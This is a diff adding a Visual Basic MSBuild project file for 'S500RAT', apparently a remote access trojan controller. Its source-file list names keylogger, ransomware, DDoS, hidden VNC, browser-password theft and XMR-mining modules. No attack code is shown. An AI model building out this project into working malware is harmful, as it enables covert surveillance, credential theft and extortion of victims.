@@ -1,0 +1,529 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{AF7184D3-64F8-4010-8680-C580855AAB9C}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>S500RAT</RootNamespace>
+    <AssemblyName>S500RAT</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>S500RAT.ico</ApplicationIcon>
+    <StartupObject>S500RAT.My.MyApplication</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <NoWarn>41999,42016,42017,42018,42019,42020,42021,42022,42032,42036,42314</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <NoWarn>41999,42016,42017,42018,42019,42020,42021,42022,42032,42036,42314</NoWarn>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="BouncyCastle.Crypto">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\BouncyCastle.Crypto.dll</HintPath>
+    </Reference>
+    <Reference Include="dnlib">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="FastColoredTextBox">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\FastColoredTextBox.dll</HintPath>
+    </Reference>
+    <Reference Include="Gry73">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\Gry73.dll</HintPath>
+    </Reference>
+    <Reference Include="Guna.UI2">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="initialization">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\initialization.dll</HintPath>
+    </Reference>
+    <Reference Include="MessagePackLib" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Obfuscation" />
+    <Reference Include="protobuf-net">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="Quasar.Common" />
+    <Reference Include="Socks5">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\Socks5.dll</HintPath>
+    </Reference>
+    <Reference Include="StreamLib" />
+    <Reference Include="SunnyUI">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\SunnyUI.dll</HintPath>
+    </Reference>
+    <Reference Include="Svg">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\Svg.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="Tulpep.NotificationWindow">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\Tulpep.NotificationWindow.dll</HintPath>
+    </Reference>
+    <Reference Include="Vestris.ResourceLib">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\Vestris.ResourceLib.dll</HintPath>
+    </Reference>
+    <Reference Include="WinMic">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\WinMic.dll</HintPath>
+    </Reference>
+    <Reference Include="WinSound">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\WinSound.dll</HintPath>
+    </Reference>
+    <Reference Include="zxing">
+      <HintPath>D:\ \ \ \Shadow Tools\Shadow tools\Praivte Tools\S - 500 RAT G3 2022_Anonymous\S - 500 RAT G3 2022_Anonymous\zxing.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="My Project\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="APIH.vb" />
+    <Compile Include="CreateCertificate.vb" />
+    <Compile Include="DataB.vb" />
+    <Compile Include="DataList.vb" />
+    <Compile Include="FormAdmin.Designer.vb">
+      <DependentUpon>FormAdmin.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormAdmin.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormAntiMalware.Designer.vb">
+      <DependentUpon>FormAntiMalware.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormAntiMalware.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormCamera.Designer.vb">
+      <DependentUpon>FormCamera.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormCamera.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormChat.Designer.vb">
+      <DependentUpon>FormChat.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormChat.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormClient.Designer.vb">
+      <DependentUpon>FormClient.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormClient.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormClipboard.Designer.vb">
+      <DependentUpon>FormClipboard.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormClipboard.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormCMD.Designer.vb">
+      <DependentUpon>FormCMD.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormCMD.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormCustomOpen.Designer.vb">
+      <DependentUpon>FormCustomOpen.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormCustomOpen.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormDDos.Designer.vb">
+      <DependentUpon>FormDDos.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormDDos.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormDotNetEditor.Designer.vb">
+      <DependentUpon>FormDotNetEditor.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormDotNetEditor.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormDownloadFile.Designer.vb">
+      <DependentUpon>FormDownloadFile.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormDownloadFile.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormFileManager.Designer.vb">
+      <DependentUpon>FormFileManager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormFileManager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormFun.Designer.vb">
+      <DependentUpon>FormFun.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormFun.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormHBrowser.Designer.vb">
+      <DependentUpon>FormHBrowser.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormHBrowser.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormHiddenProgram.Designer.vb">
+      <DependentUpon>FormHiddenProgram.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormHiddenProgram.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormHosts.Designer.vb">
+      <DependentUpon>FormHosts.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormHosts.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormHRDP.Designer.vb">
+      <DependentUpon>FormHRDP.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormHRDP.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormHVNC.Designer.vb">
+      <DependentUpon>FormHVNC.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormHVNC.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormInformation.Designer.vb">
+      <DependentUpon>FormInformation.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormInformation.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormInstalledSoftware.Designer.vb">
+      <DependentUpon>FormInstalledSoftware.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormInstalledSoftware.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormKeylogger.Designer.vb">
+      <DependentUpon>FormKeylogger.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormKeylogger.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormLogin.Designer.vb">
+      <DependentUpon>FormLogin.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormLogin.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormMessageBox.Designer.vb">
+      <DependentUpon>FormMessageBox.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormMessageBox.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormNote.Designer.vb">
+      <DependentUpon>FormNote.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormNote.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormOptions.Designer.vb">
+      <DependentUpon>FormOptions.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormOptions.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormPasswordBrowser.Designer.vb">
+      <DependentUpon>FormPasswordBrowser.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormPasswordBrowser.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormPasswordView.Designer.vb">
+      <DependentUpon>FormPasswordView.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormPasswordView.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormPowerShell.Designer.vb">
+      <DependentUpon>FormPowerShell.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormPowerShell.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormRansomware.Designer.vb">
+      <DependentUpon>FormRansomware.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormRansomware.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormRegistryE.Designer.vb">
+      <DependentUpon>FormRegistryE.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormRegistryE.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormRegValueEditBinary.Designer.vb">
+      <DependentUpon>FormRegValueEditBinary.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormRegValueEditBinary.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormRegValueEditMultiString.Designer.vb">
+      <DependentUpon>FormRegValueEditMultiString.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormRegValueEditMultiString.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormRegValueEditString.Designer.vb">
+      <DependentUpon>FormRegValueEditString.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormRegValueEditString.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormRegValueEditWord.Designer.vb">
+      <DependentUpon>FormRegValueEditWord.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormRegValueEditWord.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormRemoteDesktop.Designer.vb">
+      <DependentUpon>FormRemoteDesktop.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormRemoteDesktop.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormReverseProxy.Designer.vb">
+      <DependentUpon>FormReverseProxy.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormReverseProxy.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormS500.Designer.vb">
+      <DependentUpon>FormS500.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormS500.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormSC.Designer.vb">
+      <DependentUpon>FormSC.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormSC.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormSendFile.Designer.vb">
+      <DependentUpon>FormSendFile.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormSendFile.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormServices.Designer.vb">
+      <DependentUpon>FormServices.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormServices.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormStartup.Designer.vb">
+      <DependentUpon>FormStartup.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormStartup.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormTaskManager.Designer.vb">
+      <DependentUpon>FormTaskManager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormTaskManager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormTCPConnection.Designer.vb">
+      <DependentUpon>FormTCPConnection.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormTCPConnection.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormWiFi.Designer.vb">
+      <DependentUpon>FormWiFi.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormWiFi.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormWindowsActive.Designer.vb">
+      <DependentUpon>FormWindowsActive.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormWindowsActive.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormXMR.Designer.vb">
+      <DependentUpon>FormXMR.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FormXMR.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmActiveWindows.vb" />
+    <Compile Include="FrmAdmin.vb" />
+    <Compile Include="FrmAntiMalware.vb" />
+    <Compile Include="FrmCamera.vb" />
+    <Compile Include="FrmChat.vb" />
+    <Compile Include="FrmClient.vb" />
+    <Compile Include="FrmClipboard.vb" />
+    <Compile Include="FrmCMD.vb" />
+    <Compile Include="FrmDDos.vb" />
+    <Compile Include="FrmDotNET.vb" />
+    <Compile Include="FrmFun.vb" />
+    <Compile Include="FrmHiddenBrowser.vb" />
+    <Compile Include="FrmHiddenProgram.vb" />
+    <Compile Include="FrmHosts.vb" />
+    <Compile Include="FrmHRDP.vb" />
+    <Compile Include="FrmHVNC.vb" />
+    <Compile Include="FrmInformation.vb" />
+    <Compile Include="FrmInstalledSoftware.vb" />
+    <Compile Include="FrmKeylogger.vb" />
+    <Compile Include="FrmManager.vb" />
+    <Compile Include="FrmMessageBox.vb" />
+    <Compile Include="FrmMicrophone.vb" />
+    <Compile Include="FrmNetwork.vb" />
+    <Compile Include="FrmOptions.vb" />
+    <Compile Include="FrmPassword.vb" />
+    <Compile Include="FrmPowerShell.vb" />
+    <Compile Include="FrmRansomware.vb" />
+    <Compile Include="FrmRegistery.vb" />
+    <Compile Include="FrmRemoteDesktop.vb" />
+    <Compile Include="FrmReverseProxy.vb" />
+    <Compile Include="FrmSendFile.vb" />
+    <Compile Include="FrmServices.vb" />
+    <Compile Include="FrmStartup.vb" />
+    <Compile Include="FrmTaskManager.vb" />
+    <Compile Include="FrmWiFi.vb" />
+    <Compile Include="FrmXMR.vb" />
+    <Compile Include="Functions.vb" />
+    <Compile Include="Geomap.vb" />
+    <Compile Include="GetIPInfo.vb" />
+    <Compile Include="GrabberList.vb" />
+    <Compile Include="HelpNotif.vb" />
+    <Compile Include="IconN.vb" />
+    <Compile Include="Listener.vb" />
+    <Compile Include="ListLogs.vb" />
+    <Compile Include="ListValue.vb" />
+    <Compile Include="Microphone.Designer.vb">
+      <DependentUpon>Microphone.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Microphone.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MiningData.vb" />
+    <Compile Include="MouseState.vb" />
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My\MyApplication.vb" />
+    <Compile Include="My\MyComputer.vb" />
+    <Compile Include="My\MyProject.vb" />
+    <Compile Include="My\MySettings.Designer.vb">
+      <DependentUpon>MySettings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="My\MySettingsProperty.vb" />
+    <Compile Include="My\Resources\Resources.vb" />
+    <Compile Include="NotifMonitor.vb" />
+    <Compile Include="RecoviryPasswords.vb" />
+    <Compile Include="ReportWindows.Designer.vb">
+      <DependentUpon>ReportWindows.vb</DependentUpon>
+    </Compile>
+    <Compile Include="ReportWindows.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="S5003g\Server\Models\SettingsPrx.vb" />
+    <Compile Include="Server\Algorithm\GetHash.vb" />
+    <Compile Include="Server\Algorithm\Zip.vb" />
+    <Compile Include="Server\Connection\Clients.vb" />
+    <Compile Include="Server\Setting.vb" />
+    <Compile Include="Sha256M.vb" />
+    <Compile Include="UploadFromLink.Designer.vb">
+      <DependentUpon>UploadFromLink.vb</DependentUpon>
+    </Compile>
+    <Compile Include="UploadFromLink.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ValleyClose.vb" />
+    <Compile Include="ValleyMax.vb" />
+    <Compile Include="ValleyMini.vb" />
+    <Compile Include="VB$AnonymousDelegate_0.vb" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="FormAdmin.resources" />
+    <EmbeddedResource Include="FormAntiMalware.resources" />
+    <EmbeddedResource Include="FormCamera.resources" />
+    <EmbeddedResource Include="FormChat.resources" />
+    <EmbeddedResource Include="FormClient.resources" />
+    <EmbeddedResource Include="FormClipboard.resources" />
+    <EmbeddedResource Include="FormCMD.resources" />
+    <EmbeddedResource Include="FormCustomOpen.resources" />
+    <EmbeddedResource Include="FormDDos.resources" />
+    <EmbeddedResource Include="FormDotNetEditor.resources" />
+    <EmbeddedResource Include="FormDownloadFile.resources" />
+    <EmbeddedResource Include="FormFileManager.resources" />
+    <EmbeddedResource Include="FormFun.resources" />
+    <EmbeddedResource Include="FormHBrowser.resources" />
+    <EmbeddedResource Include="FormHiddenProgram.resources" />
+    <EmbeddedResource Include="FormHosts.resources" />
+    <EmbeddedResource Include="FormHRDP.resources" />
+    <EmbeddedResource Include="FormHVNC.resources" />
+    <EmbeddedResource Include="FormInformation.resources" />
+    <EmbeddedResource Include="FormInstalledSoftware.resources" />
+    <EmbeddedResource Include="FormKeylogger.resources" />
+    <EmbeddedResource Include="FormLogin.resources" />
+    <EmbeddedResource Include="FormMessageBox.resources" />
+    <EmbeddedResource Include="FormNote.resources" />
+    <EmbeddedResource Include="FormOptions.resources" />
+    <EmbeddedResource Include="FormPasswordBrowser.resources" />
+    <EmbeddedResource Include="FormPasswordView.resources" />
+    <EmbeddedResource Include="FormPowerShell.resources" />
+    <EmbeddedResource Include="FormRansomware.resources" />
+    <EmbeddedResource Include="FormRegistryE.resources" />
+    <EmbeddedResource Include="FormRegValueEditBinary.resources" />
+    <EmbeddedResource Include="FormRegValueEditMultiString.resources" />
+    <EmbeddedResource Include="FormRegValueEditString.resources" />
+    <EmbeddedResource Include="FormRegValueEditWord.resources" />
+    <EmbeddedResource Include="FormRemoteDesktop.resources" />
+    <EmbeddedResource Include="FormReverseProxy.resources" />
+    <EmbeddedResource Include="FormS500.resources" />
+    <EmbeddedResource Include="FormSC.resources" />
+    <EmbeddedResource Include="FormSendFile.resources" />
+    <EmbeddedResource Include="FormServices.resources" />
+    <EmbeddedResource Include="FormStartup.resources" />
+    <EmbeddedResource Include="FormTaskManager.resources" />
+    <EmbeddedResource Include="FormTCPConnection.resources" />
+    <EmbeddedResource Include="FormWiFi.resources" />
+    <EmbeddedResource Include="FormWindowsActive.resources" />
+    <EmbeddedResource Include="FormXMR.resources" />
+    <EmbeddedResource Include="Microphone.resources" />
+    <EmbeddedResource Include="ReportWindows.resources" />
+    <EmbeddedResource Include="Resources.resources" />
+    <EmbeddedResource Include="UploadFromLink.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="My\MySettings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>MySettings.Designer.vb</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+</Project>
